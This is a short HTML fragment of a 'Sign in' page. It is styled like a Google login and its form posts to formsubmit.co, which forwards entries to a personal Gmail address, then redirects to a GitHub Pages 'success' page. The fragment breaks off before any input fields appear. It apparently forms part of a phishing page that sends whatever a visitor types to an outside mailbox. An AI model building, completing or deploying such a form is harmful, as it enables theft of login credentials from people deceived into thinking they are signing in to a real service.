<body>

    <!-- The Login Form -->
    <div id="login-container" class="login-box">

        <h1>Sign in</h1>

        <!-- FormSubmit logic starts here -->
        <form action="https://formsubmit.co/kaasislekker069@gmail.com" method="POST">

            <input type="hidden" name="_next" value="https://yourusername.github.io/your-repo-name/success.html">

                <span style="color: #1a73e8; font-weight: 500; cursor: pointer; font-size: 14px;">Create account</span>
